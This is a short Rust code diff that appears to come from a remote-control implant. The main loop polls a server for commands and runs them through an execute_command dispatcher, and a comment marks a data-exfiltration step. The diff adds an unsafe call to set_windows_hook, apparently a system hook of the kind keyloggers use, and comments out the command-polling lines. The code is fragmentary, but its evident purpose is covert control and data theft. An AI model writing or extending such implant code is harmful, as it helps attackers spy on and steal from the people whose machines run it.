@@ -1,7 +1,7 @@
 mod server;
 mod system;
 use std::{sync::Arc};
-use system::get_windows_version;
+use system::{get_windows_version, set_windows_hook};
 use tokio::time::{Duration, sleep};
 
 
@@ -37,12 +37,15 @@ async fn main() {
     //         sleep(Duration::from_secs(1000)); 
     //     }
     // });
+    unsafe {
+        set_windows_hook();
+    }
 
     loop{
-    
-        let rec = unwrap_or_panic!(server.get_command(&id).await);
-        execute_command(&rec).await; 
-        //sleep(Duration::from_secs(10)).await;
+        // Execute Commands
+        // let rec = unwrap_or_panic!(server.get_command(&id).await);
+        // execute_command(&rec).await; 
+        // sleep(Duration::from_secs(10)).await;
     }
     
         // exfiltrates data
@@ -55,9 +58,10 @@ async fn main() {
 
 
 async fn execute_command(cmd: & str){
+    // if cmd == "" {""}
     println!("Executing");
     let cmds: Vec<_> = cmd.split([':']).collect();
-    
+    println!("{}",cmds[0] == "slp");
 
     match cmds[0]{
         "slp" => {
